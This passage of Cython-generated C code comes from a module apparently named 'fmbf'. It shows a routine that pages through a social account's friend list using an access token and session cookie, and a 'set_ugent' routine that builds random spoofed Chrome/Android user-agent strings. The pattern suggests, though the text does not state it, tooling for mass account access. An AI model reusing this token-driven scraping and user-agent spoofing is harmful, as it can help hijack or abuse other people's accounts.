        __pyx_t_15 = PyObject_Length(__pyx_t_9); if (unlikely(__pyx_t_15 == ((Py_ssize_t)-1))) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_15, 0, ' ', 'd'); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_9);
        __pyx_t_9 = 0;
        __Pyx_INCREF(__pyx_kp_u_id_2);
        __pyx_t_14 += 7;
        __Pyx_GIVEREF(__pyx_kp_u_id_2);
        PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u_id_2);
        __pyx_t_9 = __Pyx_PyUnicode_Join(__pyx_t_11, 3, __pyx_t_14, __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_7 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_11, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_sys); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_stdout); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_flush); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_7 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 134, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_publik); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_s_friends); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_s_paging); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_9, __pyx_n_s_cursors); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_s_after); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 135, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      __pyx_t_16 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
          __pyx_t_16 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[5] = {__pyx_t_10, __pyx_v_user, __pyx_t_9, __pyx_v_token, __pyx_v_cookie};
        __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_16, 4+__pyx_t_16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[5] = {__pyx_t_10, __pyx_v_user, __pyx_t_9, __pyx_v_token, __pyx_v_cookie};
        __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_16, 4+__pyx_t_16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      {
        __pyx_t_11 = PyTuple_New(4+__pyx_t_16); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 135, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        if (__pyx_t_10) {
          __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_10); __pyx_t_10 = NULL;
        }
        __Pyx_INCREF(__pyx_v_user);
        __Pyx_GIVEREF(__pyx_v_user);
        PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_16, __pyx_v_user);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_16, __pyx_t_9);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_11, 2+__pyx_t_16, __pyx_v_token);
        __Pyx_INCREF(__pyx_v_cookie);
        __Pyx_GIVEREF(__pyx_v_cookie);
        PyTuple_SET_ITEM(__pyx_t_11, 3+__pyx_t_16, __pyx_v_cookie);
        __pyx_t_9 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 135, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
     {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_11set_ugent(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_11set_ugent = {"set_ugent", (PyCFunction)__pyx_pw_4fmbf_4Main_11set_ugent, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_11set_ugent(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("set_ugent (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main_10set_ugent(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_10set_ugent(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_file = NULL;
  CYTHON_UNUSED long __pyx_v_z;
  PyObject *__pyx_v_versi_chrome = NULL;
  PyObject *__pyx_v_versi_android = NULL;
  PyObject *__pyx_v_anj = NULL;
  PyObject *__pyx_v_ugent = NULL;
  PyObject *__pyx_v_versi_iphone = NULL;
  PyObject *__pyx_v_model_device = NULL;
  PyObject *__pyx_v_build_device = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  int __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  long __pyx_t_9;
  Py_ssize_t __pyx_t_10;
  Py_UCS4 __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("set_ugent", 0);

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 140, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 141, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_ua);
  __pyx_t_1 = __pyx_v_ua;
  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_default, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 142, __pyx_L1_error)
  if (!__pyx_t_3) {
  } else {
    __pyx_t_2 = __pyx_t_3;
    goto __pyx_L4_bool_binop_done;
  }
  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_Default, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 142, __pyx_L1_error)
  if (!__pyx_t_3) {
  } else {
    __pyx_t_2 = __pyx_t_3;
    goto __pyx_L4_bool_binop_done;
  }
  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_n_s_DEFAULT, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 142, __pyx_L1_error)
  __pyx_t_2 = __pyx_t_3;
  __pyx_L4_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_3 = (__pyx_t_2 != 0);
  if (__pyx_t_3) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_6);
       {
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 143, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_remove); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 143, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_7, __pyx_kp_s_data_ugent) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_s_data_ugent);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 143, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      }
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L12_try_end;
      __pyx_L7_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      
       {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L8_exception_handled;
      }
      __pyx_L8_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
      __pyx_L12_try_end:;
    }

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 145, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_file = __pyx_t_1;
  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
     {

      
      for (__pyx_t_9 = 0; __pyx_t_9 < 0xC8; __pyx_t_9+=1) {
        __pyx_v_z = __pyx_t_9;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = PyNumber_Add(__pyx_t_8, __pyx_kp_s_0_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = PyNumber_Add(__pyx_t_1, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__32); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randrange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__33, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = PyNumber_Add(__pyx_t_7, __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_versi_chrome, __pyx_t_8);
        __pyx_t_8 = 0;

        
        __pyx_t_3 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_Mozilla_5_0_Linux_Android, __pyx_v_ua, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 151, __pyx_L13_error)
        __pyx_t_2 = (__pyx_t_3 != 0);
        if (__pyx_t_2) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 152, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 152, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF_SET(__pyx_v_versi_android, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_re); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sub); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 153, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_10 = 0;
          __pyx_t_11 = 127;
          __Pyx_INCREF(__pyx_kp_u_Chrome);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Chrome);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_Chrome);
          __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_v_versi_chrome, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 153, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_12);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_12);
          __pyx_t_12 = 0;
          __Pyx_INCREF(__pyx_kp_u_Mobile);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Mobile);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Mobile);
          __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 153, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[4] = {__pyx_t_1, __pyx_kp_s_Chrome_Mobile, __pyx_t_12, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 153, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[4] = {__pyx_t_1, __pyx_kp_s_Chrome_Mobile, __pyx_t_12, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 153, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          {
            __pyx_t_14 = PyTuple_New(3+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 153, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_14);
            if (__pyx_t_1) {
              __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_1); __pyx_t_1 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_Chrome_Mobile);
            __Pyx_GIVEREF(__pyx_kp_s_Chrome_Mobile);
            PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_13, __pyx_kp_s_Chrome_Mobile);
            __Pyx_GIVEREF(__pyx_t_12);
            PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_13, __pyx_t_12);
            __Pyx_INCREF(__pyx_v_ua);
            __Pyx_GIVEREF(__pyx_v_ua);
            PyTuple_SET_ITEM(__pyx_t_14, 2+__pyx_t_13, __pyx_v_ua);
            __pyx_t_12 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_14, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 153, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF_SET(__pyx_v_anj, __pyx_t_8);
          __pyx_t_8 = 0;

          
